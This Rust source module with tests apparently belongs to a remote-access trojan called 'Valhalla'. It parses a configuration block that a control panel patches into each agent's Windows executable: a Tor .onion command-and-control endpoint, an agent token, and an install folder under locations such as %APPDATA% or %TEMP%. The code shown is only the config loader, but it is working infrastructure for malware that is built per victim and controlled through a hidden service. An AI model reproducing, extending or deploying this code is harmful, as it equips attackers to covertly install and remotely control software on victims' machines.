use std::{fs, path::PathBuf};

use crate::transport::Endpoint;

// Layout of the configuration region embedded in the PE binary.
// The panel patches the payload after the magic + slot tag.
//
// Magic sentinel (8 bytes): b"VLHCFG\x00\x01"
// Slot tag:               b"VALHALLA-CFG-SLOT-V1\x00"
// Followed by the configuration payload:
//   [0]     install_dir: u8       (0=Roaming, 1=Local, 2=Temp, 3=ProgramFiles, 4=ProgramData)
//   [1..2]  folder_name_len: u16 little-endian
//   [3..3+folder_name_len]  folder_name: UTF-8
//   then:   onion_len: u16 little-endian
//   then:   onion: UTF-8
//   then:   agent_token_len: u16
//   then:   agent_token: UTF-8
//
// The entire region is 4096 bytes so the panel never has to overwrite
// executable instructions or unrelated PE data when patching an agent.

const MAGIC: &[u8; 8] = b"VLHCFG\x00\x01";
const SLOT_TAG: &[u8] = b"VALHALLA-CFG-SLOT-V1\x00";
const CONFIG_REGION_SIZE: usize = 4096;
const CONFIG_PAYLOAD_OFFSET: usize = MAGIC.len() + SLOT_TAG.len();
const BLOCK_SEARCH_MAX: usize = 64 * 1024 * 1024; // only scan first 64 MiB

// Cargo build.rs emits a dedicated, zero-filled configuration slot into every
// agent binary.  Keep both a linker-use marker and a real reference so
// release/LTO builds cannot discard the slot that the panel patches.
#[used]
static EMBEDDED_CONFIG_REGION: [u8; CONFIG_REGION_SIZE] =
    *include_bytes!(concat!(env!("OUT_DIR"), "/valhalla_config_region.bin"));

#[derive(Clone, Debug)]
pub enum InstallDir {
    Roaming,       // 0 — %APPDATA%
    Local,         // 1 — %LOCALAPPDATA%
    Temp,          // 2 — %TEMP%
    ProgramFiles,  // 3 — %PROGRAMFILES%
    ProgramData,   // 4 — %PROGRAMDATA%
}

impl InstallDir {
    pub fn from_byte(b: u8) -> Self {
        match b {
            0 => Self::Roaming,
            1 => Self::Local,
            2 => Self::Temp,
            3 => Self::ProgramFiles,
            4 => Self::ProgramData,
            _ => Self::Local,
        }
    }

    pub fn resolve(&self) -> Option<PathBuf> {
        let var = match self {
            Self::Roaming      => "APPDATA",
            Self::Local        => "LOCALAPPDATA",
            Self::Temp         => "TEMP",
            Self::ProgramFiles => "PROGRAMFILES",
            Self::ProgramData  => "PROGRAMDATA",
        };
        std::env::var_os(var).map(PathBuf::from)
    }
}

pub struct Config {
    pub install_dir: InstallDir,
    pub folder_name: String,
    pub onion: String,
    pub agent_token: String,
}

/// Read configuration from the running executable image.
/// Returns (Endpoint, display_string, InstallDir, folder_name, agent_token).
pub(crate) fn load_config() -> Result<(Endpoint, String, InstallDir, String, String), String> {
    // Keep the linker-visible configuration slot in the final PE image.
    std::hint::black_box(&EMBEDDED_CONFIG_REGION);

    let exe = std::env::current_exe()
        .map_err(|e| format!("failed to locate current executable: {e}"))?;
    let bytes = fs::read(&exe)
        .map_err(|e| format!("failed to read executable image: {e}"))?;

    let cfg = parse_config(&bytes)
        .ok_or_else(|| "embedded configuration region was not found or is invalid".to_owned())?;

    let endpoint = Endpoint::parse(&cfg.onion)
        .map_err(|e| format!("invalid embedded endpoint: {e}"))?;
    let display = cfg.onion.clone();
    if cfg.agent_token.is_empty() {
        return Err("embedded agent authorization token is empty".to_owned());
    }
    Ok((endpoint, display, cfg.install_dir, cfg.folder_name, cfg.agent_token))
}

/// Read only the connection endpoint from the embedded stub configuration.
/// This is used by the update probe, which must operate before the normal
/// argument/data-directory initialization performed by `args::get()`.
pub(crate) fn load_endpoint() -> Result<(Endpoint, String), String> {
    let (endpoint, display, _install_dir, _folder_name, _agent_token) = load_config()?;
    Ok((endpoint, display))
}

fn parse_config(bytes: &[u8]) -> Option<Config> {
    let scan_limit = bytes.len().min(BLOCK_SEARCH_MAX);
    let haystack = &bytes[..scan_limit];
    let mut search_from = 0usize;

    // The magic also exists in the parser itself, so do not trust the first
    // occurrence.  Walk every candidate and accept only a slot carrying the
    // dedicated tag and a structurally valid, populated configuration block.
    while search_from + MAGIC.len() <= haystack.len() {
        let relative = haystack[search_from..]
            .windows(MAGIC.len())
            .position(|w| w == MAGIC)?;
        let pos = search_from + relative;

        let payload_start = pos + CONFIG_PAYLOAD_OFFSET;
        let tag_start = pos + MAGIC.len();
        let region_end = pos.checked_add(CONFIG_REGION_SIZE)?;
        if region_end <= bytes.len()
            && bytes.get(tag_start..payload_start)? == &SLOT_TAG[..]
            && payload_start <= region_end
        {
            if let Some(cfg) = parse_config_payload(bytes, payload_start, region_end) {
                return Some(cfg);
            }
        }

        search_from = pos + 1;
    }

    None
}

fn parse_config_payload(bytes: &[u8], mut cursor: usize, region_end: usize) -> Option<Config> {
    let install_byte = *bytes.get(cursor)?;
    cursor += 1;
    let install_dir = InstallDir::from_byte(install_byte);

    let folder_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if folder_len > 260 { return None; }
    let folder_end = cursor.checked_add(folder_len)?;
    if folder_end > region_end { return None; }
    let folder_bytes = bytes.get(cursor..folder_end)?;
    let folder_name = std::str::from_utf8(folder_bytes).ok()?.to_owned();
    cursor = folder_end;

    let onion_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if onion_len > 512 { return None; }
    let onion_end = cursor.checked_add(onion_len)?;
    if onion_end > region_end { return None; }
    let onion_bytes = bytes.get(cursor..onion_end)?;
    let onion = std::str::from_utf8(onion_bytes).ok()?.trim().to_owned();
    cursor = onion_end;

    let agent_token_len = read_u16_le(bytes, cursor)? as usize;
    cursor += 2;
    if agent_token_len > 256 { return None; }
    let token_end = cursor.checked_add(agent_token_len)?;
    if token_end > region_end { return None; }
    let token_bytes = bytes.get(cursor..token_end)?;
    let agent_token = std::str::from_utf8(token_bytes).ok()?.trim().to_owned();

    if onion.is_empty() || agent_token.is_empty() {
        return None;
    }

    Some(Config { install_dir, folder_name, onion, agent_token })
}

fn read_u16_le(bytes: &[u8], pos: usize) -> Option<u16> {
    let lo = *bytes.get(pos)? as u16;
    let hi = *bytes.get(pos + 1)? as u16;
    Some(lo | (hi << 8))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_block(dir: u8, folder: &str, onion: &str, token: &str) -> Vec<u8> {
        let mut v = MAGIC.to_vec();
        v.extend_from_slice(SLOT_TAG);
        v.push(dir);
        let fb = folder.as_bytes();
        v.extend_from_slice(&(fb.len() as u16).to_le_bytes());
        v.extend_from_slice(fb);
        let ob = onion.as_bytes();
        v.extend_from_slice(&(ob.len() as u16).to_le_bytes());
        v.extend_from_slice(ob);
        let tb = token.as_bytes();
        v.extend_from_slice(&(tb.len() as u16).to_le_bytes());
        v.extend_from_slice(tb);
        v
    }

    #[test]
    fn parse_valid_block() {
        let block = make_block(1, "Einherjar", "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/", "token");
        let cfg = parse_config(&block).expect("should parse");
        assert!(matches!(cfg.install_dir, InstallDir::Local));
        assert_eq!(cfg.folder_name, "Einherjar");
        assert!(cfg.onion.contains(".onion"));
        assert_eq!(cfg.agent_token, "token");
    }

    #[test]
    fn parse_block_embedded_in_larger_payload() {
        let mut data = vec![0u8; 1024];
        let block = make_block(2, "Vikings", "ws://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.onion:443/valhalla", "token");
        data[512..512 + block.len()].copy_from_slice(&block);
        let cfg = parse_config(&data).expect("should find block");
        assert!(matches!(cfg.install_dir, InstallDir::Temp));
        assert_eq!(cfg.folder_name, "Vikings");
    }

    #[test]
    fn empty_bytes_returns_none() {
        assert!(parse_config(&[]).is_none());
    }

    #[test]
    fn unconfigured_slot_is_rejected() {
        let mut data = MAGIC.to_vec();
        data.extend_from_slice(SLOT_TAG);
        data.extend_from_slice(&[0u8; CONFIG_REGION_SIZE - CONFIG_PAYLOAD_OFFSET]);
        assert!(parse_config(&data).is_none());
    }

    #[test]
    fn skips_unrelated_magic_before_the_real_configuration_slot() {
        let valid = make_block(1, "Einherjar", "ws://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.onion:443/", "token");
        let mut data = MAGIC.to_vec();
        data.extend_from_slice(b"not-a-config-slot");
        data.extend_from_slice(&[0u8; 128]);
        data.extend_from_slice(&valid);

        let cfg = parse_config(&data).expect("should skip unrelated magic");
        assert_eq!(cfg.folder_name, "Einherjar");
        assert_eq!(cfg.agent_token, "token");
    }

    #[test]
    fn config_region_has_room_for_maximum_payload() {
        let max_payload = 1 + 2 + 260 + 2 + 512 + 2 + 256;
        assert!(CONFIG_PAYLOAD_OFFSET + max_payload <= CONFIG_REGION_SIZE);
    }
}
